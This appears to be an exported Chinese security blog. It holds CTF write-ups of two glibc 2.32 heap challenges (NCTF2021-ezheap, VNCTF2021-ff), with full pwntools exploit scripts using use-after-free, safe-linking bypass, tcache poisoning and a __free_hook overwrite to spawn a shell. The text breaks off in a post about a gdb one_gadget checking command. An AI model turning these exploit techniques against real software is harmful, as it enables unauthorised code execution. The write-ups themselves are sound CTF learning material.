<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="NCTF2021-ezheap"><a href="#NCTF2021-ezheap" class="headerlink" title="NCTF2021-ezheap"></a>NCTF2021-ezheap</h4><p><a href="https://github.com/X1cT34m/NCTF2021/tree/main/Pwn/ezheap">题目链接</a></p>
<p>本题的 <code>libc</code> 版本为 <code>2.32</code>，因为是本地复现，所以我就随便选了一个 <code>2.32</code> 的小版本来做了</p>
<h5 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044578.png" alt="image-20230319104415444" style="zoom:67%;" />

<h5 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h5><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191044228.png" alt="image-20230319104447181" style="zoom:50%;" />

<p>在 <code>delete</code> 函数中，发现 <code>free</code> 掉 <code>malloc_store[index]</code> 后将 <code>size_store[index]</code> 给置空了，由于忘记给 <code>malloc_store[index]</code> 造成了 <code>UAF</code> 。</p>
<p>因为本题有 <code>edit</code> 和 <code>show</code> 函数，所以篡改 <code>next</code> 以及泄露堆地址和 <code>libc</code> 地址都较为轻松</p>
<h5 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h5><h6 id="edit-after-free"><a href="#edit-after-free" class="headerlink" title="edit-after-free"></a>edit-after-free</h6><p>考虑一点就是 <code>delete</code> 函数后会将 <code>size[index]</code> 置空，如果直接 <code>edit</code> 的话，无法往里面写入数据。采取的措施是 先申请 <code>chunk1</code> 然后将其释放，此时它的 <code>size</code> 被置空了，但是地址依然留在了 <code>malloc_store</code> 里面，此时再申请等大的 <code>chunk2</code>，此时再次释放 <code>chunk1</code> （因为刚刚的 <code>chunk2</code> 是将原本的 <code>chunk1</code> 申请出来了，所以这里不会造成 <code>double free</code>），此时 <code>chunk1</code> 和 <code>chunk2</code> 指向的地址是相同的，<code>chunk1</code> 的 <code>size</code> 为 <code>0</code>， <code>chunk2</code> 的 <code>size</code> 正常，并且编辑 <code>chunk2</code> 就可以篡改已经处于 <code>free</code> 状态的 <code>chunk1</code>，从而修改其 <code>next</code> 指针。（如下图）</p>
<p>通过下图可以发现，此时 <code>0x000055d5f6e622a0</code> 的位置是有两个，第二个对应的 <code>size</code> 是 <code>0x70</code>，所以可以在这里篡改 <code>next</code> 指针</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191104276.png" alt="image-20230319110417830" style="zoom: 67%;" />



<h6 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h6><p>此时的 <code>tcache bin</code> 中只有一个堆块，执行 <code>show</code> 函数泄露其 <code>next</code> 指针数据，得到了 <code>0x551dcbb2</code> ，我们将其左移 <code>12</code> 位即可得到堆地址（因为 <code>next</code> 原本为 <code>0</code>，和 <code>0</code> 异或结果不变）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191109678.png" alt="image-20230319110941492" style="zoom:50%;" />

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br></pre></td></tr></table></figure>

<p>此时即可得到堆地址（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191113663.png" alt="image-20230319111330505" style="zoom:50%;" />



<h6 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h6><p>最后一点需要考虑的是如何将 <code>__free_hook</code> 写入到 <code>next</code> 指针上。</p>
<p>因为 <code>safe_Linking</code> 机制会存放 <code>next</code> 指针运算后的结果，因此 <code>tcache poisoning</code> 只需要我们自己将 <code>__free_hook</code> 地址进行同样方法运算写入 <code>next</code> 位置（如下）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br></pre></td></tr></table></figure>

<p><code>heap_base+0x2a0</code> 是当前 <code>free</code> 后进入 <code>tcache bin</code> 堆块的用户地址</p>
<p>此时 <code>__free_hook</code> 写入 <code>next</code> 后的情况如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191154909.png" alt="image-20230319115455792"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191155547.png" alt="image-20230319115549446"></p>
<p>最后将 <code>__free_hook</code> 申请出来写入 <code>system</code> 地址，通过 <code>free</code> 释放掉一个存有 <code>/bin/sh</code> 字符串的堆块，获取 <code>shell</code>。</p>
<p><strong>注意：</strong> 需要提前布局 <code>0x80</code> 这条链的堆块，保证其 <code>counts</code> 在申请 <code>__free_hook</code> 时要大于 <code>0</code>，否则无法从这条 <code>tcache bin</code> 中申请出来 <code>__free_hook</code></p>
<h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">p,e,libc=load(<span class="string">&quot;ezheap&quot;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)<span class="comment">#leak heap_address</span></span><br><span class="line"></span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;b&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;preven chunk&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">11</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">11</span>)<span class="comment">#goto unsorted bin</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">10</span>)<span class="comment">#leak libc</span></span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e3c00</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">value=((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^free_hook</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x1769</span>,<span class="number">0x172A</span>,<span class="number">0x1754</span>,<span class="number">0x173F</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(value))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x70</span>,p64(sys_addr))</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303191159819.png" alt="image-20230319115958381" style="zoom: 50%;" />







<h4 id="VNCTF2021-ff"><a href="#VNCTF2021-ff" class="headerlink" title="VNCTF2021-ff"></a>VNCTF2021-ff</h4><p>题目附件在 BUUCTF 中的 VNCTF2021 比赛中可以找到</p>
<h5 id="保护策略"><a href="#保护策略" class="headerlink" title="保护策略"></a>保护策略</h5><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201401195.png" alt="image-20230320140126119"></p>
<h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p><code>libc</code> 为 <code>2.32-0ubuntu3_amd64</code> ，这个版本存在 <code>safe-Linking</code> 机制</p>
<p><code>add</code> 函数，对 <code>size</code> 进行了限制，最大能申请 <code>0x7f</code> ,并且申请出来的堆块索引会被赋值为全局变量 <code>idx</code> ，最多申请 <code>0x10</code> 个堆块</p>
<p><code>delete</code> 函数存在 <code>UAF</code> 漏洞，但是我们无法选择索引释放指定的堆块，只能释放索引为 <code>idx</code> 的堆块（也就是只能释放最近一次申请的堆块）</p>
<p><code>show</code> 函数也是只能打印出最近一次申请堆块中的八个字节数据，并且 <code>show</code> 函数只有一次执行的机会 </p>
<p><code>edit</code> 函数只能向最近一次堆块中写入 <code>0x10</code> 字节的数据，并且 <code>edit</code> 函数只能执行两次</p>
<h5 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h5><p>因为本题一个麻烦的点在于 <code>edit</code> <code>show</code> <code>delete</code> 函数都只能对最近一个申请出来的堆块操作，所以需要反复调试进行一个布局。</p>
<p><code>add</code> 函数最大申请 <code>0x80</code> 的堆块，这就导致了泄露 <code>libc</code> 地址泄露不出来（即使填满 <code>tcache bin</code> 因为还需要做一个阻止与 <code>top chunk</code> 合并的堆块，也是无法将 <code>libc</code> 泄露出来的，就算真的泄露出来还要考虑 <code>safe-Linking</code> ）</p>
<p>所以这里最终选择的是泄露 <code>heap</code> 地址，利用 <code>UAF</code> 加上 <code>show</code> 函数即可泄露堆地址（将泄露出来的数据左移 <code>12</code> 位）</p>
<p>需要注意的是 <code>edit</code> 函数可以写入 <code>0x10</code> 个字节的数据，这样可以篡改 <code> free</code> 状态堆块的 <code>key</code> 字段，给了我们 <code>double free</code> 的机会，目的是去将 <code>pthread_tcache_struct</code> 申请出来（此时两次 <code>edit</code> 机会已经用完）</p>
<p>之后泄露 <code>libc</code> 肯定要考虑残留一个 <code>main_arena+96</code> 地址，然后爆破申请 <code>_IO_2_1_stdout_</code> 结构体泄露 <code>libc</code> 。本题堆块即使填满 <code>tcache bin</code> 也会落入 <code>fast bin</code> 中（<code>0x90</code> 虽然落不进去，但产生了 <code>main_arena+96</code> 也没办法改为 <code>_IO_2_1_stdout_</code> 地址）</p>
<p>所以只能将 <code>pthread_tcache_struct</code> 释放掉进入 <code>unsorted bin</code> ，当我们每次去从 <code>unsorted bin</code> 中切割堆块的时候，都会残留 <code>main_arena+96</code> 在 <code>pthread_tcache_struct</code> 中，当 <code>main_arena+96</code> 正好落到 <code>tcache</code> 头指针的位置，我们再切割 <code>unsorted bin</code> 的时候就能篡改 <code>main_arena+96</code> 改为 <code>_IO_2_1_stdout</code> 地址了。</p>
<p>注意：从 <code>tcache bin</code> 中申请堆块出来需要保证 <code>counts &gt; 0</code> ，为了最后还有机会做一个 <code>__free_hook</code> 申请出来，我们必须让申请出来的堆块尽可能小（在后面堆块布局的时候就会发现这点）</p>
<h5 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h5><p>调试过程主要演示如何将 <code>__IO_2_1_stdout</code> 和 <code>__free_hook</code> 申请出来</p>
<p>下图是申请 <code>pthread_tcache_struct</code> 前的情况，申请出来要写入 <code>b&#39;\x00\x00&#39; * 0x27 + b&#39;\x07\x00&#39;</code> ，这样正好将 <code>0x290</code> 这条链的 <code>counts</code> 设置为 <code>7</code>，保证了释放掉 <code>pthread_tcache_struct</code> 后可以进入 <code>unsorted bin</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202028776.png" alt="image-20230320202839431" style="zoom: 50%;" />



<p>下图是 <code>pthread_tcache_struct</code> 进入了 <code>unsorted bin</code> ，接下来我们需要反复从 <code>unsorted bin</code> 里来切堆块</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202032910.png" alt="image-20230320203243312" style="zoom:50%;" />



<p>我们第一个要切下来的堆块大小为 <code>0x40</code>，写入的数据为 <code>&#39;\x00\x00&#39;*3+&#39;\x01\x00&#39;*1+&#39;\x00\x00&#39;*2+&#39;\x01\x00&#39;+&#39;\x00&#39;*0x38</code> ，这样才可以让 <code>0x50</code> 和 <code>0x80</code> 这两条链上的 <code>counts</code> 为 <code>1</code>（如下图）（这里就是一个布局，为后面申请 <code>_IO_2_1_stdout</code> 和 <code>__free_hook</code> 做准备）</p>
<p>自己做题的时候，这里肯定不是第一次就能写出来的，等调试到后面发现这里需要构造 <code>counts</code> ，才拐回来布置的，包括申请的堆块大小为 <code>0x40</code> 也是反复调试更改后确定的。总结一下就是这些数据都是调试得来的。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202035978.png" alt="image-20230320203552375" style="zoom:50%;" />



<p>再次申请一个 <code>0x30</code> 堆块，这次发送的数据全部填写 <code>\x00</code> 即可，此时 <code>pthread_tcache_struct</code> 中已经残留了被切割后的 <code>main_arena+96</code> （如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202041239.png" alt="image-20230320204130712" style="zoom:50%;" />



<p>申请一个 <code>0x10</code> 的堆块，写入数据为 <code>\xc0\x16</code> （这是 <code>_IO_2_1_stdout_</code> 的后两字节，不过第一位需要爆破），写入的数据会正好落在刚刚残留的 <code>main_arena+96</code> 上，从而产生了 <code>_IO_2_1_stdout_</code> 地址，并且 <code>0x50</code> 这条链的 <code>counts</code> 已经被设置为 <code>1</code>  了，所以是可以申请出来的（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202045688.png" alt="image-20230320204516358" style="zoom:50%;" />



<p><code>io leak</code> 就不说了 此处<code>exp</code> 的代码为 </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p> 具体做法请参考 <a href="https://zikh26.github.io/posts/a9dd00f0.html">文章</a> ，现在我们已经拿到了 <code>libc</code> 地址并且 <code>bins</code> 的情况如下</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202052487.png" alt="image-20230320205222092" style="zoom:50%;" />



<p>申请一个 <code>0x10</code> 的堆块，写入 <code>__free_hook</code> 的地址，该地址会正好落在 <code>0x80</code> 的 <code>tcache</code> 头（如下），<code>__free_hook</code> 为什么会正好落在这里？   别问，问就是布局 ◕‿◕</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202055913.png" alt="image-20230320205508486" style="zoom:50%;" />



<p>因为之前已经将 <code>0x80</code> 这条链的 <code>counts</code> 设置为 <code>1</code>，所以可以直接将 <code>__free_hook</code> 申请出来，然后写入 <code>system</code> 地址。然后观察 <code>0x20</code> 这条链是没有任何数据的，我们就可以申请一个 <code>0x20</code> 的堆块存入 <code>/bin/sh</code> 再将其释放，即可获取 <code>shell</code></p>
<p>本题注意的几点：</p>
<ol>
<li>很多看似顺理成章的布局，其实都是反复调试出来的</li>
<li><code>counts</code> 为 <code>0</code> 的时候，从 <code>tcache bin</code> 中申请不出来堆块</li>
<li><code>counts</code> 大于 <code>0</code> 的时候，如果里面的值不是一个合法地址，则申请时会报错</li>
<li>为了打最后的 <code>tcache poisoning</code> ，必须要让每次申请堆块的 <code>size</code> 尽可能的小，这样才能让 <code>__free_hook</code> 落在 <code>0x80</code> ，再往后的话因为对 <code>add</code> 函数中对  <code>size</code> 检查的原因，就申请不出来了</li>
<li>往 <code>pthread_tcache_struct</code> 中写入数据时，尽可能的写入 <code>\x00</code> ，不然可能会破坏某些 <code>tcache bin</code> 的 <code>counts</code></li>
</ol>
<h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26738&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">edit(p64(((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^(heap_base+<span class="number">0x10</span>)))</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">0x27</span> + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;\x01\x00&#x27;</span>*<span class="number">1</span>+<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;\x01\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\xc0\x16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e4744</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xE86</span>,<span class="number">0xE6D</span>,<span class="number">0xE5E</span>,<span class="number">0xED5</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x70</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201357465.png" alt="image-20230320135639350"></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>Safe-Linking</tag>
      </tags>
  </entry>
  <entry>
    <title>check_gadget--检测one_gadget能否使用的gdb命令</title>
    <url>/posts/bd34f701.html</url>
    <content><![CDATA[<p>作为一个 <code>pwner</code> ，对 <code>one_gadget</code> 肯定不会陌生，如果在能劫持执行流的前提下， <code>one_gadget</code> 在劫持执行流的位置也恰巧能用，那就可以在一定程度上简化获取 <code>shell</code> 的操作，因为执行 <code>system(&quot;/bin/sh\x00&quot;)</code> 是需要控制参数的，有些情况下劫持执行流容易但可能控制参数还得再废些力气，此时成功打一发 <code>one_gadget</code> 可以说是方便又迅速。</p>
<p>但因为 <code>one_gadget</code> 条件的限制， <code>one_gadget</code> 成功的概率并不高，通常是一个一个试，或者调试到劫持执行流的位置观察一下寄存器和内存的情况进行判断。很早之前我就有这样一个想法，如果能用 <code>gdb</code> 调试到劫持的地址处，输入一个命令直接判断所有的 <code>one_gadget</code> 能否生效该有多方便。终于在几天前进行了动手实践，并将其写出来。</p>
<span id="more"></span>

<p><code>check_gadget</code> 是一个 <code>gdb</code> 命令，该命令我是用 <code>python</code> 进行编写的 这篇 <a href="https://zikh26.github.io/posts/26ba4673.html">文章</a> 记录了如何用 <code>python</code> 来自定义命令。</p>
<h2 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h2><p>此处控制了 <code>__free_hook</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081628082.png" alt="image-20230208162838925" style="zoom:50%;" />

<p>然后我们 <code>si</code> 进去，使用 <code>check_gadget</code> 命令，发现了一个可用的 <code>one_gadget</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081627797.png" alt="image-20230208162716225" style="zoom: 50%;" />



<p>该命令是判断当前位置的 <code>one_gadget</code> 能否生效,所以这个命令在哪里都可以使用，但真正用到 <code>one_gadget</code> 的地方应该是我们控制执行流的地址。</p>
<p>即使在对 <code>32</code> 位的程序的判断中，该命令依然发挥出色</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081633584.png" alt="image-20230208163319420"></p>
<h2 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h2><p>这个命令本身是依赖 <code>one_gadget</code> 的返回条件进行判断的，但有时候 <code>one_gadget</code> 给出的条件虽然不满足但也能获取 <code>shell</code> （如下），而 <code>check_gadget</code> 命令无法检测出来这种情况。</p>
<p>下图是跳转到了一个 <code>one_gadget</code> 中，并没有满足 <code>one_gadget</code> 的条件，但依然可以获取 <code>shell</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081609202.png" alt="image-20230208160957660" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081611903.png" alt="image-20230208161106805" style="zoom:50%;" />



<h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p>判断 <code>one_gadget</code> 的大致想法无非就两个，第一个是直接改变 <code>rip</code> 跑一遍 <code>one_gadget</code> （ <strong>winmt</strong> 师傅给我的提示是在当前要测试 <code>one_gadget</code> 的位置直接开多个子进程然后分别改变 <code>rip</code> 为不同的 <code>one_gadget</code> 以便测试所有的 <code>one_gadget</code> ），第二个思路就是我的这种，去将 <code>one_gadget</code> 的条件提取出来，访问寄存器和内存的值，来检查条件是否成立。</p>
<p>其实第一种思路我认为才是最优解，主要是 <strong>winmt</strong> 师傅给我说这种思路的时候我已经把命令写完了 QAQ ,因为第二种思路有上面所提到的缺陷。</p>
<p>下面说一下我这个命令的整体实现思路</p>
<ol>
<li>首先去获取 <code>one_gadget</code> 的所有信息，并进行逐一分组</li>
<li>逐一判断每个 <code>one_gadget</code> 中的条件，利用正则表达式和 <code>if</code> 判断识别其特征，并调用相应的处理函数</li>
<li>获取其关键信息，比如 <code>[rsp+0x40] == NULL</code> 这个条件,就需要先识别出来外面有一组 <code>[]</code> ，然后还需要提取出来 <code>rsp</code> <code>+</code> <code>0x40</code> 这三个关键信息，利用 <code>gdb</code> 模块中的一些函数来访问寄存器和内存的值，进行处理后来判断等式是否成立</li>
<li>最后将一组命令的返回值都存储到一个列表中，只需要遍历返回值列表就知道哪组 <code>one_gadget</code> 可以使用或者不能使用</li>
</ol>
<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>创建一个 <code>command.py</code> 文件（名字随意，位置也随意），将下面的源代码复制进去</p>
<p>然后在 <code>.gdbinit</code> 文件中写入代码 <code>source /home/zikh/Desktop/command.py</code> 引入这个 <code>command.py</code> 文件（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302081641185.png" alt="image-20230208164134100"></p>
<p>并且在 <code>.gdbinit</code> 文件的末尾添加代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">define check_gadget</span><br><span class="line">    python check_gadget_cmd()</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>接着启动 <code>gdb</code> 调试，就可以使用该命令了</p>
<h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">a,b=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_libc_path</span>():</span><br><span class="line">    recv_data = gdb.execute(<span class="string">&quot;vmmap&quot;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">    lines = recv_data.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">      <span class="keyword">if</span> <span class="string">&#x27;libc&#x27;</span> <span class="keyword">in</span> line:  </span><br><span class="line">        string=line.split()[-<span class="number">1</span>]</span><br><span class="line">        string = string[:-<span class="number">4</span>]</span><br><span class="line">        <span class="keyword">return</span> string</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gadget_info</span>(<span class="params">library</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    该函数作用是获取当前 libc 的 one_gadget信息 -l2除外</span></span><br><span class="line"><span class="string">    将每一组的 one_gadget 